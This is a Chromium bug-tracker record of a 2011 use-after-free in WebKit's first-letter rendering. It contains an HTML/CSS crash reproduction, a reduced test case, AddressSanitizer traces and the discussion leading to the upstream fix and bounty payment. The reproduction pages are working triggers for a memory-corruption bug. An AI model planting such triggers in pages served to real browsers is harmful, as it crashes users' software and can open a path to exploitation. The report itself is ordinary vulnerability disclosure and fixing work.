# Use after free with first-letter

| Field | Value |
|-------|-------|
| **Issue ID** | [40095746](https://issues.chromium.org/issues/40095746) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ke...@chromium.org |
| **Created** | 2011-09-29 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

similar to before

**VERSION**  

Chrome Version:

Chromium 16.0.895.0 (Developer Build 103239)  

OS Linux  

WebKit 535.5 (trunk@96296)  

JavaScript V8 3.6.4.1

Operating System: 64 bit linux

**REPRODUCTION CASE**

<style>
:before {
display: table;
content: "B";
}
@font-face { font-family: "A"; src: url(); }
body { font-family: A; }
:first-letter{ height: 1px }
</style>
<script>
setTimeout("location.reload()",100)
</script>
<br>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==16913== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffe0771300 at pc 0x7ffff3893611 bp 0x7fffffff9280 sp 0x7fffffff9270  

READ of size 8 at 0x7fffe0771300 thread T0  

#0 0x7ffff3893611 in WebCore::RenderTextFragment::willBeDestroyed() ???:0  

0x7fffe0771300 is located 605 bytes to the right of 4131-byte region [0x7fffe0770080,0x7fffe07710a3)  

allocated by thread T0 here:  

#0 0x7ffff5e16f7a in malloc *asan\_rtl*  

#1 0x7ffff208bb0b in WTF::fastMalloc(unsigned long) ???:0  

#2 0x7ffff598d867 in WebCore::ArenaAllocate(WebCore::ArenaPool\*, unsigned int) ???:0  

#3 0x7ffff35e57f0 in WebCore::RenderArena::allocate(unsigned long) ???:0

## Attachments

- [repro.html](attachments/repro.html) (text/plain; charset=us-ascii, 238 B)
- [asan.txt](attachments/asan.txt) (text/x-c; charset=us-ascii, 7.2 KB)
- [reduced.html](attachments/reduced.html) (text/html; charset=us-ascii, 293 B)

## Timeline

### mi...@gmail.com (2011-09-29)

body:before and body:first-letter are the active selectors

### in...@chromium.org (2011-09-29)

https://bugs.webkit.org/show_bug.cgi?id=69088

Hits assert
    // The original string is going to be either a generated content string or a DOM node's
    // string.  We want the original string before it got transformed in case first-letter has
    // no text-transform or a different text-transform applied to it.
    RefPtr<StringImpl> oldText = textObj->originalText();
    ASSERT(oldText);

Miaubiz, just confining the selectors to body tag would not be considered a fully reduced testcase in most cases [since it will affect all child tags]. you need to check out which exact tag those selectors have to go through.

### mi...@gmail.com (2011-09-29)

how about 

<html>
  <head>
    <style>
      p:before {
        display: table;
        content: "B";
      }
      p:first-letter { height: 1px; }
      br { font-family: A; }
      @font-face { font-family: "A"; src: url(); }
    </style>
  </head>
  <body>
    <p>
    <br>
    </p>
  </body>
</html>


### mi...@gmail.com (2011-09-29)

as a file

### in...@chromium.org (2011-09-29)

Yes, that is exactly the cleaner and reduced version we want.

### ke...@chromium.org (2011-09-29)

I'm investigating this one.

### in...@chromium.org (2011-09-29)

The crash stack does not reflect stale font issue. So, this is a different first-letter issue.

ASAN:SIGILL
=================================================================
==10640== ERROR: AddressSanitizer heap-use-after-free on address 0x7ff69c0db180 at pc 0x7ff6c4598f69 bp 0x7ff69f6f0590 sp 0x7ff69f6f0580
READ of size 8 at 0x7ff69c0db180 thread T13
    #0 0x7ff6c4598f69 in WebCore::RenderTextFragment::willBeDestroyed() Source/WebCore/rendering/RenderTextFragment.cpp:74
    #1 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #2 0x7ff6c453d95e in WebCore::RenderObjectChildList::destroyLeftoverChildren() Source/WebCore/rendering/RenderObjectChildList.cpp:50
    #3 0x7ff6c43cf467 in WebCore::RenderBlock::willBeDestroyed() Source/WebCore/rendering/RenderBlock.cpp:168
    #4 0x7ff6c456188a in WebCore::RenderTableCell::willBeDestroyed() Source/WebCore/rendering/RenderTableCell.cpp:59
    #5 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #6 0x7ff6c453d95e in WebCore::RenderObjectChildList::destroyLeftoverChildren() Source/WebCore/rendering/RenderObjectChildList.cpp:50
    #7 0x7ff6c453ac33 in WebCore::RenderObject::willBeDestroyed() Source/WebCore/rendering/RenderObject.cpp:2176
    #8 0x7ff6c444d0cc in WebCore::RenderBox::willBeDestroyed() Source/WebCore/rendering/RenderBox.cpp:216
    #9 0x7ff6c456ba9d in WebCore::RenderTableRow::willBeDestroyed() Source/WebCore/rendering/RenderTableRow.cpp:48
    #10 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #11 0x7ff6c453d95e in WebCore::RenderObjectChildList::destroyLeftoverChildren() Source/WebCore/rendering/RenderObjectChildList.cpp:50
    #12 0x7ff6c453ac33 in WebCore::RenderObject::willBeDestroyed() Source/WebCore/rendering/RenderObject.cpp:2176
    #13 0x7ff6c444d0cc in WebCore::RenderBox::willBeDestroyed() Source/WebCore/rendering/RenderBox.cpp:216
    #14 0x7ff6c456d4fd in WebCore::RenderTableSection::willBeDestroyed() Source/WebCore/rendering/RenderTableSection.cpp:93
    #15 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #16 0x7ff6c453d95e in WebCore::RenderObjectChildList::destroyLeftoverChildren() Source/WebCore/rendering/RenderObjectChildList.cpp:50
    #17 0x7ff6c43cf467 in WebCore::RenderBlock::willBeDestroyed() Source/WebCore/rendering/RenderBlock.cpp:168
    #18 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #19 0x7ff6c453d95e in WebCore::RenderObjectChildList::destroyLeftoverChildren() Source/WebCore/rendering/RenderObjectChildList.cpp:50
    #20 0x7ff6c43cf467 in WebCore::RenderBlock::willBeDestroyed() Source/WebCore/rendering/RenderBlock.cpp:168
    #21 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #22 0x7ff6c37eac41 in WebCore::Node::detach() Source/WebCore/dom/Node.cpp:1390
    #23 0x7ff6c37c3cea in WebCore::Element::detach() Source/WebCore/dom/Element.cpp:998
    #24 0x7ff6c375b0a9 in WebCore::ContainerNode::detach() Source/WebCore/dom/ContainerNode.cpp:773
    #25 0x7ff6c37c3cea in WebCore::Element::detach() Source/WebCore/dom/Element.cpp:998
    #26 0x7ff6c375b0a9 in WebCore::ContainerNode::detach() Source/WebCore/dom/ContainerNode.cpp:773
    #27 0x7ff6c3772c7e in WebCore::Document::detach() Source/WebCore/dom/Document.cpp:1873
    #28 0x7ff6c405de16 in WebCore::Frame::setView(WTF::PassRefPtr<WebCore::FrameView>) Source/WebCore/page/Frame.cpp:273
    #29 0x7ff6c346176d in WebKit::WebFrameImpl::createFrameView() Source/WebKit/chromium/src/WebFrameImpl.cpp:1987
    #30 0x7ff6c3f98b15 in WebCore::FrameLoader::transitionToCommitted(WTF::PassRefPtr<WebCore::CachedPage>) Source/WebCore/loader/FrameLoader.cpp:1934
    #31 0x7ff6c3f97aa4 in WebCore::FrameLoader::commitProvisionalLoad() Source/WebCore/loader/FrameLoader.cpp:1781
    #32 0x7ff6c3f61e2c in WebCore::DocumentLoader::commitLoad(char const*, int) Source/WebCore/loader/DocumentLoader.cpp:296
    #33 0x7ff6c3fc8172 in WebCore::ResourceLoader::didReceiveData(char const*, int, long long, bool) Source/WebCore/loader/ResourceLoader.cpp:297
    #34 0x7ff6c3fb1020 in void WTF::derefIfNotNull<WebCore::MainResourceLoader>(WebCore::MainResourceLoader*) Source/JavaScriptCore/wtf/PassRefPtr.h:59
    #35 0x7ff6c3fc909b in WebCore::ResourceLoader::didReceiveData(WebCore::ResourceHandle*, char const*, int, int) Source/WebCore/loader/ResourceLoader.cpp:448
    #36 0x7ff6c33ae8f2 in ResourceDispatcher::OnReceivedData(IPC::Message const&, int, base::FileDescriptor, int, int) /usr/local/google/home/aarya/chrome2/src/content/common/resource_dispatcher.cc:377
    #37 0x7ff6c33afde0 in bool ResourceMsg_DataReceived::Dispatch<ResourceDispatcher, ResourceDispatcher, int, base::FileDescriptor, int, int>(IPC::Message const*, ResourceDispatcher*, ResourceDispatcher*, void (ResourceDispatcher::*)(IPC::Message const&, int, base::FileDescriptor, int, int)) /usr/local/google/home/aarya/chrome2/src/./content/common/resource_messages.h:135
    #38 0x7ff6c33ae13b in ResourceDispatcher::DispatchMessage(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/content/common/resource_dispatcher.cc:523
    #39 0x7ff6c33ad571 in ResourceDispatcher::OnMessageReceived(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/content/common/resource_dispatcher.cc:302
    #40 0x7ff6c32b35a8 in ChildThread::OnMessageReceived(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/content/common/child_thread.cc:142
    #41 0x7ff6c33f8a5e in IPC::ChannelProxy::Context::OnDispatchMessage(IPC::Message const&) /usr/local/google/home/aarya/chrome2/src/ipc/ipc_channel_proxy.cc:263
    #42 0x7ff6c1ea3ba9 in base::subtle::TaskClosureAdapter::Run() /usr/local/google/home/aarya/chrome2/src/base/task.cc:56
    #43 0x7ff6c1e3fbd2 in MessageLoop::RunTask(MessageLoop::PendingTask const&) /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:477
    #44 0x7ff6c1e40024 in MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask const&) /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:492
    #45 0x7ff6c1e403f3 in MessageLoop::DoWork() /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:682
    #46 0x7ff6c1e4c728 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) /usr/local/google/home/aarya/chrome2/src/base/message_pump_default.cc:23
    #47 0x7ff6c1e3f53c in MessageLoop::RunInternal() /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:443
    #48 0x7ff6c1e3e408 in MessageLoop::Run() /usr/local/google/home/aarya/chrome2/src/base/message_loop.cc:341
    #49 0x7ff6c1ea7898 in base::Thread::ThreadMain() /usr/local/google/home/aarya/chrome2/src/base/threading/thread.cc:163
    #50 0x7ff6c1ea6a3c in base::(anonymous namespace)::ThreadFunc(void*) /usr/local/google/home/aarya/chrome2/src/base/threading/platform_thread_posix.cc:58
    #51 0x7ff6c61b4e41 in AsanThread::ThreadStart() /usr/local/google/asan/address-sanitizer/asan/asan_thread.cc:105
    #52 0x7ff6bc7669ca in start_thread ??:0
    #53 0x7ff6ba8e670d in __clone ??:0
0x7ff69c0db180 is located 0 bytes inside of 104-byte region [0x7ff69c0db180,0x7ff69c0db1e8)
freed by thread T13 here:
    #0 0x7ff6c61ab4f3 in free _asan_rtl_
    #1 0x7ff6c453d95e in WebCore::RenderObjectChildList::destroyLeftoverChildren() Source/WebCore/rendering/RenderObjectChildList.cpp:50
    #2 0x7ff6c43cf467 in WebCore::RenderBlock::willBeDestroyed() Source/WebCore/rendering/RenderBlock.cpp:168
    #3 0x7ff6c456188a in WebCore::RenderTableCell::willBeDestroyed() Source/WebCore/rendering/RenderTableCell.cpp:59
    #4 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #5 0x7ff6c453d95e in WebCore::RenderObjectChildList::destroyLeftoverChildren() Source/WebCore/rendering/RenderObjectChildList.cpp:50
    #6 0x7ff6c453ac33 in WebCore::RenderObject::willBeDestroyed() Source/WebCore/rendering/RenderObject.cpp:2176
    #7 0x7ff6c444d0cc in WebCore::RenderBox::willBeDestroyed() Source/WebCore/rendering/RenderBox.cpp:216
    #8 0x7ff6c456ba9d in WebCore::RenderTableRow::willBeDestroyed() Source/WebCore/rendering/RenderTableRow.cpp:48
    #9 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #10 0x7ff6c453d95e in WebCore::RenderObjectChildList::destroyLeftoverChildren() Source/WebCore/rendering/RenderObjectChildList.cpp:50
    #11 0x7ff6c453ac33 in WebCore::RenderObject::willBeDestroyed() Source/WebCore/rendering/RenderObject.cpp:2176
    #12 0x7ff6c444d0cc in WebCore::RenderBox::willBeDestroyed() Source/WebCore/rendering/RenderBox.cpp:216
    #13 0x7ff6c456d4fd in WebCore::RenderTableSection::willBeDestroyed() Source/WebCore/rendering/RenderTableSection.cpp:93
    #14 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #15 0x7ff6c453d95e in WebCore::RenderObjectChildList::destroyLeftoverChildren() Source/WebCore/rendering/RenderObjectChildList.cpp:50
    #16 0x7ff6c43cf467 in WebCore::RenderBlock::willBeDestroyed() Source/WebCore/rendering/RenderBlock.cpp:168
    #17 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #18 0x7ff6c453d95e in WebCore::RenderObjectChildList::destroyLeftoverChildren() Source/WebCore/rendering/RenderObjectChildList.cpp:50
    #19 0x7ff6c43cf467 in WebCore::RenderBlock::willBeDestroyed() Source/WebCore/rendering/RenderBlock.cpp:168
    #20 0x7ff6c453ad9e in WebCore::RenderObject::destroy() Source/WebCore/rendering/RenderObject.cpp:2206
    #21 0x7ff6c37eac41 in WebCore::Node::detach() Source/WebCore/dom/Node.cpp:1390
    #22 0x7ff6c37c3cea in WebCore::Element::detach() Source/WebCore/dom/Element.cpp:998
    #23 0x7ff6c375b0a9 in WebCore::ContainerNode::detach() Source/WebCore/dom/ContainerNode.cpp:773
    #24 0x7ff6c37c3cea in WebCore::Element::detach() Source/WebCore/dom/Element.cpp:998
    #25 0x7ff6c375b0a9 in WebCore::ContainerNode::detach() Source/WebCore/dom/ContainerNode.cpp:773
    #26 0x7ff6c3772c7e in WebCore::Document::detach() Source/WebCore/dom/Document.cpp:1873
    #27 0x7ff6c405de16 in WebCore::Frame::setView(WTF::PassRefPtr<WebCore::FrameView>) Source/WebCore/page/Frame.cpp:273
    #28 0x7ff6c346176d in WebKit::WebFrameImpl::createFrameView() Source/WebKit/chromium/src/WebFrameImpl.cpp:1987
    #29 0x7ff6c3f98b15 in WebCore::FrameLoader::transitionToCommitted(WTF::PassRefPtr<WebCore::CachedPage>) Source/WebCore/loader/FrameLoader.cpp:1934
previously allocated by thread T13 here:
    #0 0x7ff6c61ab3e3 in malloc _asan_rtl_
    #1 0x7ff6c43ff9d7 in WebCore::RenderBlock::updateFirstLetter() Source/WebCore/rendering/RenderBlock.cpp:5570
    #2 0x7ff6c43d57da in WebCore::RenderBlock::layout() Source/WebCore/rendering/RenderBlock.cpp:1150
    #3 0x7ff6c43e4ae4 in WebCore::RenderBlock::layoutBlockChild(WebCore::RenderBox*, WebCore::RenderBlock::MarginInfo&, int&, int&) Source/WebCore/rendering/RenderBlock.cpp:2019
    #4 0x7ff6c43da0fe in WebCore::RenderBlock::layoutBlockChildren(bool, int&) Source/WebCore/rendering/RenderBlock.cpp:1953
    #5 0x7ff6c43d60bb in WebCore::RenderBlock::layoutBlock(bool, int, WebCore::RenderBlock::BlockLayoutPass) Source/WebCore/rendering/RenderBlock.cpp:1268
    #6 0x7ff6c43d5811 in WebCore::RenderBlock::layout() Source/WebCore/rendering/RenderBlock.cpp:1154
    #7 0x7ff6c43e4ae4 in WebCore::RenderBlock::layoutBlockChild(WebCore::RenderBox*, WebCore::RenderBlock::MarginInfo&, int&, int&) Source/WebCore/rendering/RenderBlock.cpp:2019
    #8 0x7ff6c43da0fe in WebCore::RenderBlock::layoutBlockChildren(bool, int&) Source/WebCore/rendering/RenderBlock.cpp:1953
    #9 0x7ff6c43d60bb in WebCore::RenderBlock::layoutBlock(bool, int, WebCore::RenderBlock::BlockLayoutPass) Source/WebCore/rendering/RenderBlock.cpp:1268
    #10 0x7ff6c43d5811 in WebCore::RenderBlock::layout() Source/WebCore/rendering/RenderBlock.cpp:1154
    #11 0x7ff6c45af2da in WebCore::RenderView::layout() Source/WebCore/rendering/RenderView.cpp:136
    #12 0x7ff6c406f290 in WebCore::FrameView::layout(bool) Source/WebCore/page/FrameView.cpp:1090
    #13 0x7ff6c376f472 in WebCore::Document::implicitClose() Source/WebCore/dom/Document.cpp:2229
    #14 0x7ff6c3f8ca6d in WebCore::FrameLoader::checkCompleted() Source/WebCore/loader/FrameLoader.cpp:744
    #15 0x7ff6c3f8a814 in WebCore::FrameLoader::finishedParsing() Source/WebCore/loader/FrameLoader.cpp:678
    #16 0x7ff6c3783917 in WebCore::Document::finishedParsing() Source/WebCore/dom/Document.cpp:4293
    #17 0x7ff6c395ac77 in WebCore::HTMLDocumentParser::prepareToStopParsing() Source/WebCore/html/parser/HTMLDocumentParser.cpp:153
    #18 0x7ff6c3f732ac in WebCore::DocumentWriter::endIfNotLoadingMainResource() Source/WebCore/loader/DocumentWriter.cpp:236
    #19 0x7ff6c3f9a7f9 in WebCore::FrameLoader::finishedLoading() Source/WebCore/loader/FrameLoader.cpp:2084
    #20 0x7ff6c3fb1173 in WebCore::MainResourceLoader::didFinishLoading(double) Source/WebCore/loader/MainResourceLoader.cpp:477
    #21 0x7ff6c4f76259 in webkit_glue::WebURLLoaderImpl::Context::OnCompletedRequest(net::URLRequestStatus const&, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, base::Time const&) /usr/local/google/home/aarya/chrome2/src/webkit/glue/weburlloader_impl.cc:629
    #22 0x7ff6c33b0086 in bool ResourceMsg_RequestComplete::Dispatch<ResourceDispatcher, ResourceDispatcher, void (ResourceDispatcher::*)(int, net::URLRequestStatus const&, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, base::Time const&)>(IPC::Message const*, ResourceDispatcher*, ResourceDispatcher*, void (ResourceDispatcher::*)(int, net::URLRequestStatus const&, std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, base::Time const&)) /usr/local/google/home/aarya/chrome2/src/./content/common/resource_messages.h:149
Thread T13 created by T0 here:
    #0 0x7ff6c61aa567 in pthread_create _asan_rtl_
    #1 0x7ff6c1ea67c7 in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThread::Delegate*, unsigned long*) /usr/local/google/home/aarya/chrome2/src/base/threading/platform_thread_posix.cc:119
    #2 0x7ff6c1ea66ca in base::PlatformThread::Create(unsigned long, base::PlatformThread::Delegate*, unsigned long*) /usr/local/google/home/aarya/chrome2/src/base/threading/platform_thread_posix.cc:230
    #3 0x7ff6c1ea7115 in base::Thread::StartWithOptions(base::Thread::Options const&) /usr/local/google/home/aarya/chrome2/src/base/threading/thread.cc:74
    #4 0x7ff6c5364d2b in BrowserRenderProcessHost::Init(bool) /usr/local/google/home/aarya/chrome2/src/content/browser/renderer_host/browser_render_process_host.cc:312
    #5 0x7ff6c526ad7b in RenderViewHost::CreateRenderView(std::basic_string<unsigned short, base::string16_char_traits, std::allocator<unsigned short> > const&) /usr/local/google/home/aarya/chrome2/src/content/browser/renderer_host/render_view_host.cc:161
    #6 0x7ff6c53060a4 in TabContents::CreateRenderViewForRenderManager(RenderViewHost*) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/tab_contents.cc:1984
    #7 0x7ff6c53061bd in non-virtual thunk to TabContents::CreateRenderViewForRenderManager(RenderViewHost*) ???:0
    #8 0x7ff6c52f1dcb in RenderViewHostManager::InitRenderView(RenderViewHost*, NavigationEntry const&) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/render_view_host_manager.cc:563
    #9 0x7ff6c52f0fba in RenderViewHostManager::Navigate(NavigationEntry const&) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/render_view_host_manager.cc:101
    #10 0x7ff6c52fe968 in TabContents::NavigateToEntry(NavigationEntry const&, NavigationController::ReloadType) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/tab_contents.cc:578
    #11 0x7ff6c52fe8d5 in TabContents::NavigateToPendingEntry(NavigationController::ReloadType) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/tab_contents.cc:572
    #12 0x7ff6c52e5daf in NavigationController::NavigateToPendingEntry(NavigationController::ReloadType) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/navigation_controller.cc:1061
    #13 0x7ff6c52e670c in NavigationController::LoadEntry(NavigationEntry*) /usr/local/google/home/aarya/chrome2/src/content/browser/tab_contents/navigation_controller.cc:279
    #14 0x7ff6c0d66724 in browser::Navigate(browser::NavigateParams*) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_navigator.cc:485
    #15 0x7ff6c161f4f0 in BrowserInit::LaunchWithProfile::OpenTabsInBrowser(Browser*, bool, std::vector<BrowserInit::LaunchWithProfile::Tab, std::allocator<BrowserInit::LaunchWithProfile::Tab> > const&) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:1065
    #16 0x7ff6c161de74 in BrowserInit::LaunchWithProfile::ProcessSpecifiedURLs(std::vector<GURL, std::allocator<GURL> > const&) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:975
    #17 0x7ff6c161db43 in BrowserInit::LaunchWithProfile::ProcessStartupURLs(std::vector<GURL, std::allocator<GURL> > const&) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:942
    #18 0x7ff6c161cb8a in BrowserInit::LaunchWithProfile::ProcessLaunchURLs(bool, std::vector<GURL, std::allocator<GURL> > const&) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:863
    #19 0x7ff6c161bc7e in BrowserInit::LaunchWithProfile::Launch(Profile*, std::vector<GURL, std::allocator<GURL> > const&, bool) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:706
    #20 0x7ff6c161ac0c in BrowserInit::LaunchBrowser(CommandLine const&, Profile*, FilePath const&, bool, int*) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:563
    #21 0x7ff6c1620f19 in BrowserInit::ProcessCmdLineImpl(CommandLine const&, FilePath const&, bool, Profile*, int*, BrowserInit*) /usr/local/google/home/aarya/chrome2/src/chrome/browser/ui/browser_init.cc:1474
    #22 0x7ff6c188ce8a in BrowserInit::Start(CommandLine const&, FilePath const&, Profile*, int*) /usr/local/google/home/aarya/chrome2/src/./chrome/browser/ui/browser_init.h:38
    #23 0x7ff6c188ab3d in ChromeBrowserMainParts::PreMainMessageLoopRunInternal() /usr/local/google/home/aarya/chrome2/src/chrome/browser/chrome_browser_main.cc:1850
    #24 0x7ff6c1888ab1 in ChromeBrowserMainParts::PreMainMessageLoopRun() /usr/local/google/home/aarya/chrome2/src/chrome/browser/chrome_browser_main.cc:1172
    #25 0x7ff6c511a669 in content::BrowserMainParts::RunMainMessageLoopParts() /usr/local/google/home/aarya/chrome2/src/content/browser/browser_main.cc:254
    #26 0x7ff6c511acc8 in BrowserMain(MainFunctionParams const&) /usr/local/google/home/aarya/chrome2/src/content/browser/browser_main.cc:422
    #27 0x7ff6c1d20074 in (anonymous namespace)::RunNamedProcessTypeMain(std::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, MainFunctionParams const&, content::ContentMainDelegate*) /usr/local/google/home/aarya/chrome2/src/content/app/content_main.cc:252
    #28 0x7ff6c1d1f89b in content::ContentMain(int, char const**, content::ContentMainDelegate*) /usr/local/google/home/aarya/chrome2/src/content/app/content_main.cc:442
    #29 0x7ff6c0ab4bc7 in ChromeMain /usr/local/google/home/aarya/chrome2/src/chrome/app/chrome_main.cc:752
    #30 0x7ff6c0ab3e0b in main /usr/local/google/home/aarya/chrome2/src/chrome/app/chrome_exe_main_gtk.cc:18
    #31 0x7ff6ba81ec4d in __libc_start_main ??:0
    #32 0x7ff6c0ab3d29 in _start ??:0
==10640== ABORTING
Shadow byte and word:
  0x1ffed381b630: fd
  0x1ffed381b630: fd fd fd fd fd fd fd fd
More shadow bytes:
  0x1ffed381b610: fd fd fd fd fd fd fd fd
  0x1ffed381b618: fd fd fd fd fd fd fd fd
  0x1ffed381b620: fa fa fa fa fa fa fa fa
  0x1ffed381b628: fa fa fa fa fa fa fa fa
=>0x1ffed381b630: fd fd fd fd fd fd fd fd
  0x1ffed381b638: fd fd fd fd fd fd fd fd
  0x1ffed381b640: fa fa fa fa fa fa fa fa
  0x1ffed381b648: fa fa fa fa fa fa fa fa
  0x1ffed381b650: 00 00 00 00 00 00 00 00

### in...@chromium.org (2011-09-30)

mitz has a patch upstream.

### ke...@chromium.org (2011-09-30)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-10-02)

 https://crbug.com/chromium/98556#c5 From mitz@webkit.org 2011-09-30 14:36:35 PST (-) [reply] 
Fixed in<http://trac.webkit.org/r96427>.
 https://crbug.com/chromium/98556#c6 From mitz@webkit.org 2011-09-30 19:29:37 PST (-) [reply] 
Accidentally-committed assertion removed in <http://trac.webkit.org/changeset/96445>.

### js...@chromium.org (2011-10-05)

Batch update: assuming these security changes impacted stable based on some fuzzy filtering.

### in...@chromium.org (2011-10-07)

merged to m15 in r96953

### sc...@gmail.com (2011-10-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-19)

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-10-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-28)

Payment in system, can take up to a couple of weeks.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/98556?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095746)*
